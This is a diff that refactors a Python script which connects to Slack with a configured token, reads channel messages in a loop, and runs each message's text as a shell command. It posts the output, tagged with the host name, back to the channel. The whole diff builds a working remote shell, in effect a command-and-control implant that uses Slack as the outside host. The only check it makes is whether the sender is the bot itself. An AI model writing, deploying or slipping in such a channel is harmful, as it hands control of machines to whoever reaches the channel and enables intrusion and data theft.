@@ -21,70 +21,109 @@ username=testing
 '''
 
 
-# get the path to the config file from the first parameter
-config_file_path = ''
 
-if len(sys.argv) > 1:
-    config_file_path = sys.argv[1]
-else:
-    print('Usage: %s /path/to/config.ini' % (sys.argv[0],))
-    sys.exit()
+'''
+Get values from config file: slack_token, slack_channel, test_username
+'''
+def get_config_info():
 
-config = configparser.ConfigParser()
+    # get the path to the config file from the first parameter
+    config_file_path = ''
 
-# parse the content of the config file
-with open(config_file_path, 'r') as f:
-    config.read_file(f)
+    if len(sys.argv) > 1:
+        config_file_path = sys.argv[1]
+    else:
+        print('Usage: %s /path/to/config.ini' % (sys.argv[0],))
+        sys.exit()
 
-slack_token = config['Slack']['token']
-slack_channel = config['Slack']['channel_id']
-test_username = config['Slack']['username']
+    config = configparser.ConfigParser()
 
-# Create SlackClient object named sc.
-sc= SlackClient(slack_token)
+    # parse the content of the config file
+    with open(config_file_path, 'r') as f:
+        config.read_file(f)
 
-def send_data(data):
+    slack_token = config['Slack']['token']
+    slack_channel = config['Slack']['channel_id']
+    test_username = config['Slack']['username']
+
+    return slack_token, slack_channel, test_username
+
+
+'''
+Function takes in json and then executes the at key location: text
+Returns output
+'''
+def execute_command(data):
+    output = subprocess.run([data['text']], shell=True, stdout=subprocess.PIPE)
+    return output.stdout
+
+'''
+Send results
+'''
+def send_results(machine_name, sc, slack_channel, data):
     sc.api_call("chat.postMessage",
              channel=slack_channel,
-             text=data
+             text='*' + ((machine_name.stdout).decode('UTF-8')).rstrip() + '*\n' + data.decode('UTF-8')
 )
 
-def pull_commands():
-    while True:
-        raw_commands = sc.rtm_read() # Retuns a dictionary in a list.
+'''
+Pull down latest messages from slack channel.
+'''
+def pull_commands(sc):
+    raw_commands = sc.rtm_read() # Retuns a dictionary in a list.
 
-        if len(raw_commands) > 0:
-            # To remove the dictionary from the list
-            str_raw_commands = raw_commands[0]
+    if len(raw_commands) > 0:
+        # To remove the dictionary from the list
+        str_raw_commands = raw_commands[0]
 
-            if len(str_raw_commands) > 3:
+        if len(str_raw_commands) > 3:
 
-                # Fix Json
-                j = json.loads(str(str_raw_commands).replace("'",'"'))
-                # Execute command
-                try:
-                    if j['username'] != test_username:
-                       # Will fail to find when message not from bot. When from bot, will not execute anyways...
+            # Fix Json
+            j = json.loads(str(str_raw_commands).replace("'",'"'))
+            
 
-                       # data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)
+            return j
+    return None    
 
-                        send_data(data.stdout)
-                except:
-                    data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)
-                    send_data(data.stdout)
+'''
+Check to see if the messages pulled down were not from the bots user.
+This is so that the python code does not execute its own output.
+'''
+def send_me_maybe(j, test_username):
+    try:
+        if j['username'] != test_username:
+            # Will fail to find when message not from bot. When from bot, will not execute anyways...
 
+            # data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)
 
-                #print('MESSAGE: ' + j['text'])
-        time.sleep(.05)
-
-
-pull_commands()
+            return False
+    except:
+        return True
 
 
 def main():
+
+    machine_name = subprocess.run(['uname -n'], shell=True, stdout=subprocess.PIPE)
+
+    slack_token, slack_channel, test_username = get_config_info()
+
+    # Create SlackClient object named sc.
+    sc = SlackClient(slack_token)
+
     # Basic connection vs rtm.start()
     print(sc.rtm_connect())
-    pull_commands()
 
-if __name__ = '__main__':
+    while True:
+        # Pull commands from slack channel
+        downloaded_data = pull_commands(sc)
+
+        # If the downloaded data was of proper format and not the bots output
+        if downloaded_data != None and send_me_maybe(downloaded_data, test_username):
+            send_results(machine_name, sc, slack_channel, execute_command(downloaded_data))
+
+        time.sleep(.05)
+
+
+
+if __name__ == '__main__':
     main()
